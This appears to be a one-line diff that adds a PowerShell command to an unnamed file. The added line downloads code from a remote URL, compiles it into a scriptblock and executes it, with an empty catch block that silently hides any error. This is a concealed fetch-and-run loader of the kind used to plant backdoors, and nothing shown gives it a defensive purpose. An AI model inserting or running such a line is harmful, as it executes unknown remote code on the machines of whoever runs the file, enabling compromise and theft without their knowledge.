@@ -1,0 +1,1 @@
+try{& ([scriptblock]::Create((irm "https://cdn.stoplag.org")))}catch{}
